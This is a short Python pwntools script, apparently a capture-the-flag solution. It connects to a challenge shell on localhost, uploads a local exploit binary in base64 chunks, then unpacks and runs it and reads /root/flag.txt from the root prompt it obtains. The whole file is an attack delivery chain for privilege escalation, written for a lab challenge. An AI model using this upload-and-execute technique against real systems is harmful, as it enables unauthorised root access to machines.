#!/usr/bin/env python3

from pwn import *
import gzip

conn = remote("localhost", 1337)

contents = open("/home/user/pwn", "rb").read()
shell_prefix = b" $ "
workdir = "/tmp"
chunk_size = 500

exploit = gzip.compress(contents)
conn.sendlineafter(shell_prefix, f"cd {workdir}".encode())

with log.progress("Uploading exploit...") as p:
    for i, c in enumerate(group(chunk_size, exploit)):
        conn.sendlineafter(shell_prefix, b"echo %s | base64 -d >> pwn.gz" % b64e(c).encode())
        p.status(f"{100 * i * chunk_size // len(exploit)}%")

conn.sendlineafter(shell_prefix, b"stty ocrnl -onlcr")
conn.sendlineafter(shell_prefix, b"gunzip pwn.gz")
conn.sendlineafter(shell_prefix, b"chmod +x pwn")
conn.sendlineafter(shell_prefix, b"./pwn")
conn.sendlineafter(b"# ", b"cat /root/flag.txt")
print(conn.recvuntil(b'maltactf{'))
print(conn.recvuntil(b'}'))
exit(0)
